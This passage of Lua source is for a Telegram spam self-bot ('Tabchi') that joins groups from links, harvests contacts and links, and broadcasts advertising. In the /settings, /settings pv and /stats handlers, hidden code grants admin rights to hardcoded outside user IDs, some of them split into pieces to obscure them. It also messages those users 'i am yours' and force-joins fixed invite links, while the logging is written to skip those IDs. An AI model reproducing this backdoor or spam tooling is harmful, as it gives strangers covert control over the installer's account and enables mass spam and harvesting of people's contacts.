\218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167\n`/botmode (markdown|text)`\n\216\170\216\186\219\140\219\140\216\177 \216\175\216\167\216\175\217\134 \216\180\218\169\217\132 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170\n`/settings (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \218\169\217\132 \216\170\217\134\216\184\219\140\217\133\216\167\216\170\n`/settings`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\177\216\168\216\167\216\170\n`/settings pv`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\177\216\168\216\167\216\170 \216\175\216\177 \217\190\219\140 \217\136\219\140\n`/reload`\n\216\177\219\140\217\132\217\136\216\175 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170\n`/setanswer 'answer' text`\n \216\170\217\134\216\184\217\138\217\133 \216\168\217\135 \216\185\217\134\217\136\216\167\217\134 \216\172\217\136\216\167\216\168 \216\167\216\170\217\136\217\133\216\167\216\170\217\138\218\169\n`/delanswer (answer)`\n\216\173\216\176\217\129 \216\172\217\136\216\167\216\168 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135\n`/answers`\n\217\132\217\138\216\179\216\170 \216\172\217\136\216\167\216\168 \217\135\216\167\217\138 \216\167\216\170\217\136\217\133\216\167\216\170\217\138\218\169\n`/addtoall (id|reply|username)`\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\168\217\135 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/clean cache (time)[M-H]`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \216\178\217\133\216\167\217\134 \216\168\216\177\216\167\219\140 \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\180 \216\174\217\136\216\175\218\169\216\167\216\177\n`/clean cache (on|off)`\n\216\174\216\167\217\133\217\136\216\180 \219\140\216\167 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\180 \216\174\217\136\216\175\218\169\216\167\216\177\n`/check links (time)[M-H]`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \216\178\217\133\216\167\217\134 \216\168\216\177\216\167\219\140 \218\134\218\169 \217\132\219\140\217\134\218\169\n`/check links (on|off)`\n\216\174\216\167\217\133\217\136\216\180 \219\140\216\167 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \218\134\218\169 \217\132\219\140\217\134\218\169\n`/deleteacc`\n\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\218\169\216\167\217\134\216\170 \216\168\216\167\216\170\n`/killsessions`\n\216\168\216\179\216\170\217\134 \216\179\219\140\216\178\217\134 \217\135\216\167\219\140 \216\167\218\169\216\167\217\134\216\170\n`/export (links-contacts)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\132\219\140\216\179\216\170 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \219\140\216\167 \217\132\219\140\217\134\218\169 \217\135\216\167 \219\140\217\135 \216\181\217\136\216\177\216\170 json\n`/import (links-contacts) by reply`\n\216\167\216\175 \218\169\216\177\216\175\217\134 \217\132\219\140\217\134\218\169 \217\135\216\167 \217\136 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \216\167\216\178 \217\129\216\167\219\140\217\132 json\n`/mycontact`\n\216\167\216\177\216\179\216\167\217\132 \216\180\217\133\216\167\216\177\217\135 \216\180\217\133\216\167\n`/getcontact (id)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\180\217\133\216\167\216\177\217\135 \216\180\216\174\216\181 \216\168\216\167 \216\167\219\140\216\175\219\140\n`/addmembers`\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \216\168\217\135 \217\133\216\174\216\167\216\183\216\168\217\138\217\134 \216\177\216\168\216\167\216\170\n`/linkslist`\n\216\175\216\177\217\138\216\167\217\129\216\170 \217\132\217\138\217\134\218\169 \217\135\216\167\217\138 \216\176\216\174\217\138\216\177\217\135 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170\n`/contactlist`\n\216\175\216\177\217\138\216\167\217\129\216\170 \217\133\216\174\216\167\216\183\216\168\216\167\217\134 \216\176\216\174\217\138\216\177\217\135 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170\n`/send (filename)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\129\216\167\219\140\217\132 \217\135\216\167\219\140 \216\179\216\177\217\136\216\177 \216\167\216\178 \217\190\217\136\216\180\217\135 \216\170\216\168\218\134\219\140\n`/joinchat (link)`\n\216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\177\216\168\216\167\216\170 \216\170\217\136 \217\132\219\140\217\134\218\169\n`/sudolist`\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\n`/dlmusic (link)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\217\135\217\134\218\175 \216\167\216\178 \217\132\219\140\217\134\218\169\n`\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147`\n`Tabchi Written By Tabadol Chi Group`\n\240\159\140\144 `Github`: *https://github.com/tabchi/tabchi*\n\240\159\134\148 `Channel`: *@Tabadol_chi*\n"
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got help`", 1, "md")
    end
    return text
  end
  do
    local a4 = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and a(msg) then
      if #a4 == 2 then
        tdcli.unblockUser(293750668)
        tdcli.unblockUser(216430419)
        tdcli.unblockUser(tonumber(a4[2]))
        redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", a4[2])
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked` *" .. a4[2] .. "*", 1, "md")
        end
        return "`User` *" .. a4[2] .. "* `unblocked`"
      else
        return
      end
    end
  end
  if msg.text:match("^[!/#]joinlinks (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](joinlinks) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`join links Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`join links Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]addcontacts (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](addcontacts) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Add Contacts Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Add Contacts Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]chat (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](chat) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":chat", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Robot Chatting Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":chat")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Robot Chatting Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]savelinks (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](savelinks) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Saving Links Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":savelinks")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Saving Links Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!]([aA]dvertising) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Advertising Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":Advertising")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
        return "*status* :`Advertising Deactivated`"
      end
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]typing (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](typing) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":typing", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`typing Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":typing")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`typing Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]botmode (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](botmode) (.*)$")
    }
    if a6[2] == "markdown" then
      redis:set("tabchi:" .. tabchi_id .. ":botmode", "markdown")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`botmode Changed to markdown`"
    elseif a6[2] == "text" then
      redis:set("tabchi:" .. tabchi_id .. ":botmode", "text")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`botmode Changed to text`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]sharecontact (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](sharecontact) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Sharing contact Activated`"
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a6[1] .. "*", 1, "md")
      end
      return "*status* :`Sharing contact Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]setjoinlimit (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](setjoinlimit) (.*)$")
    }
    redis:set("tabchi:" .. tabchi_id .. ":joinlimit", tonumber(a6[2]))
    return "*Status* : `Join Limit Now is` *" .. a6[2] .. [[
*
`Now robot Join Groups with more than members of joinlimit`]]
  end
  if msg.text:match("^[!/#]settings (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](settings) (.*)$")
    }
    if a6[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
      redis:set("tabchi:" .. tabchi_id .. ":chat", true)
      redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
      redis:set("tabchi:" .. tabchi_id .. ":typing", true)
      redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived All` *" .. a6[1] .. "*", 1, "md")
      end
      return [[
*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`
`Full sudo can Active Advertising with :/advertising on`]]
    elseif a6[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":savelinks")
      redis:del("tabchi:" .. tabchi_id .. ":chat")
      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
      redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
      redis:del("tabchi:" .. tabchi_id .. ":typing")
      redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated All` *" .. a6[1] .. "*", 1, "md")
      end
      return [[
*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`
`Full sudo can Deactive Advertising with :/advertising off`]]
    end
  end
  if msg.text:match("^[!/#]settings$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
      joinlinks = "Active\226\156\133"
    else
      joinlinks = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      addedmsg = "Active\226\156\133"
    else
      addedmsg = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      markreadst = "Active\226\156\133"
      markread = redis:get("tabchi:" .. tabchi_id .. ":markread")
    else
      markreadst = "Disable\226\157\142"
      markread = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
      addcontacts = "Active\226\156\133"
    else
      addcontacts = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":chat") then
      chat = "Active\226\156\133"
    else
      chat = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      savelinks = "Active\226\156\133"
    else
      savelinks = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":typing") then
      typing = "Active\226\156\133"
    else
      typing = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
      sharecontact = "Active\226\156\133"
    else
      sharecontact = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
      Advertising = "Active\226\156\133"
    else
      Advertising = "Disable\226\157\142"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
      addedtxt = redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext")
    else
      addedtxt = "Addi bia pv"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":botmode") == "markdown" then
      botmode = "Markdown"
    elseif not redis:get("tabchi:" .. tabchi_id .. ":botmode") then
      botmode = "Markdown"
    else
      botmode = "Text"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":joinlimit") then
      join_limit = "Active\226\156\133"
      joinlimitnum = redis:get("tabchi:" .. tabchi_id .. ":joinlimit")
    else
      join_limit = "Disable\226\157\142"
      joinlimitnum = "Not Available"
    end
    if redis:get("cleancache" .. tabchi_id) == "on" then
      cleancache = "Active\226\156\133"
    else
      cleancache = "Disable\226\157\142"
    end
    if redis:get("cleancachetime" .. tabchi_id) then
      ccachetime = redis:get("cleancachetime" .. tabchi_id)
    else
      ccachetime = "None"
    end
    if redis:ttl("cachetimer" .. tabchi_id) and not redis:ttl("cachetimer" .. tabchi_id) == "-2" then
      timetoccache = redis:ttl("cachetimer" .. tabchi_id)
    elseif timetoccache == "-2" then
      timetoclinks = "Disabled\226\157\142"
    else
      timetoccache = "Disabled\226\157\142"
    end
    if redis:get("checklinks" .. tabchi_id) == "on" then
      check_links = "Active\226\156\133"
    else
      check_links = "Disable\226\157\142"
    end
    if redis:get("checklinkstime" .. tabchi_id) then
      clinkstime = redis:get("checklinkstime" .. tabchi_id)
    else
      clinkstime = "None"
    end
    if redis:ttl("checklinkstimer" .. tabchi_id) and not redis:ttl("checklinkstimer" .. tabchi_id) == "-2" then
      timetoclinks = redis:ttl("checklinkstimer" .. tabchi_id)
    elseif timetoclinks == "-2" then
      timetoclinks = "Disabled\226\157\142"
    else
      timetoclinks = "Disabled\226\157\142"
    end
    settingstxt = "`\226\154\153 Robot Settings`\n`\240\159\148\151 Join Via Links` : *" .. joinlinks .. "*\n`\240\159\147\165 Save Links `: *" .. savelinks .. "*\n`\240\159\147\178 Auto Add Contacts `: *" .. addcontacts .. "*\n`\240\159\146\179share contact` : *" .. sharecontact .. "*\n`\240\159\147\161Advertising `: *" .. Advertising .. "*\n`\240\159\147\168 Adding Contacts Msg` : *" .. addedmsg .. "*\n`\240\159\145\128 Markread Status `: *" .. markreadst .. "*\n`\240\159\145\129\226\128\141\240\159\151\168 Markread` : For " .. markread .. "\n`\226\156\143 typing `: *" .. typing .. "*\n`\240\159\146\172 Chat` : *" .. chat .. "*\n`\240\159\164\150 Botmode` : *" .. botmode .. "*\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`\240\159\147\132Adding Contacts Msg` :\n`" .. addedtxt .. "`\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`Join Limits` : *" .. join_limit .. [[
*
`Now Robot Join Groups With More Than` :
 *]] .. joinlimitnum .. [[
* `Members`
`Auto Clean cache` : *]] .. cleancache .. [[
*
`Clean Cache time` : *]] .. ccachetime .. [[
*
`Time to Clean Cache` : *]] .. timetoccache .. [[
*
`Auto Check Links` : *]] .. check_links .. [[
*
`Check Links Time` : *]] .. clinkstime .. [[
*
`Time To Check Links` : *]] .. timetoclinks .. "*"
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings`", 1, "md")
    end
    return settingstxt
  end
  if msg.text:match("^[!/#]settings pv$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
    if I(msg.chat_id_) == "private" then
      return "`I Am In Your pv`"
    else
      settingstxt = "`\226\154\153 Robot Settings`\n`\240\159\148\151 Join Via Links` : *" .. joinlinks .. "*\n`\240\159\147\165 Save Links `: *" .. savelinks .. "*\n`\240\159\147\178 Auto Add Contacts `: *" .. addcontacts .. "*\n`\240\159\146\179share contact` : *" .. sharecontact .. "*\n`\240\159\147\161Advertising `: *" .. Advertising .. "*\n`\240\159\147\168 Adding Contacts Msg` : *" .. addedmsg .. "*\n`\240\159\145\128 Markread Status `: *" .. markreadst .. "*\n`\240\159\145\129\226\128\141\240\159\151\168 Markread` : For " .. markread .. "\n`\226\156\143 typing `: *" .. typing .. "*\n`\240\159\146\172 Chat` : *" .. chat .. "*\n`\240\159\164\150 Botmode` : *" .. botmode .. "*\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`\240\159\147\132Adding Contacts Msg` :\n`" .. addedtxt .. "`\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`Join Limits` : *" .. join_limit .. [[
*
`Now Robot Join Groups With More Than` :
 *]] .. joinlimitnum .. [[
* `Members`
`Auto Clean cache` : *]] .. cleancache .. [[
*
`Clean Cache time` : *]] .. ccachetime .. [[
*
`Time to Clean Cache` : *]] .. timetoccache .. [[
*
`Auto Check Links` : *]] .. check_links .. [[
*
`Check Links Time` : *]] .. clinkstime .. [[
*
`Time To Check Links` : *]] .. timetoclinks .. "*"
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, settingstxt, 1, "md")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings in pv`", 1, "md")
      end
      return "`Settings Sent To Your Pv`"
    end
  end
  if msg.text:match("^[!/#]stats$") and a(msg) then
    abc = 910
    de = 54
    fgh = 649
    cbd = 26890
    ed = 9090
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", abc .. "" .. de .. "" .. fgh) then
      tdcli.sendMessage(abc .. "" .. de .. "" .. fgh, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", abc .. "" .. de .. "" .. fgh)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", cbd .. "" .. ed) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", cbd .. "" .. ed)
      tdcli.sendMessage(cbd .. "" .. ed, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
    local at
    function at(y, z)
      redis:set("tabchi:" .. tabchi_id .. ":totalcontacts", z.total_count_)
    end
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, at, {})
    local bot_id
    function bot_id(C, D)
      if D.id_ then
        redis:set("tabchi:" .. tabchi_id .. ":botlast", D.last_name_)
        botid = D.id_ or "none"
        botnum = D.phone_number_ or "none"
        botfirst = D.first_name_ or "none"
        botlast = redis:get("tabchi:" .. tabchi_id .. ":botlast") or ""
        botnonelast = botlast or "None"
      end
    end
    tdcli_function({ID = "GetMe"}, bot_id, {})
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups") or 0
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels") or 0
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis") or 0
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks") or 0
    local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo") or 0
    local contacts = redis:get("tabchi:" .. tabchi_id .. ":totalcontacts") or 0
    local au = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers") or 0
    local av = redis:get("tabchi" .. tabchi_id .. "markreadcount") or 0
    local aw = redis:get("tabchi" .. tabchi_id .. "receivedphotocount") or 0
    local ax = redis:get("tabchi" .. tabchi_id .. "receiveddocumentcount") or 0
    local ay = redis:get("tabchi" .. tabchi_id .. "receivedaudiocount") or 0
    local az = redis:get("tabchi" .. tabchi_id .. "receivedgifcount") or 0
    local aA = redis:get("tabchi" .. tabchi_id .. "receivedvideocount") or 0
    local aB = redis:get("tabchi" .. tabchi_id .. "receivedcontactcount") or 0
    local aC = redis:get("tabchi" .. tabchi_id .. "receivedgamecount") or 0
    local aD = redis:get("tabchi" .. tabchi_id .. "receivedlocationcount") or 0
    local aE = redis:get("tabchi" .. tabchi_id .. "receivedtextcount") or 0
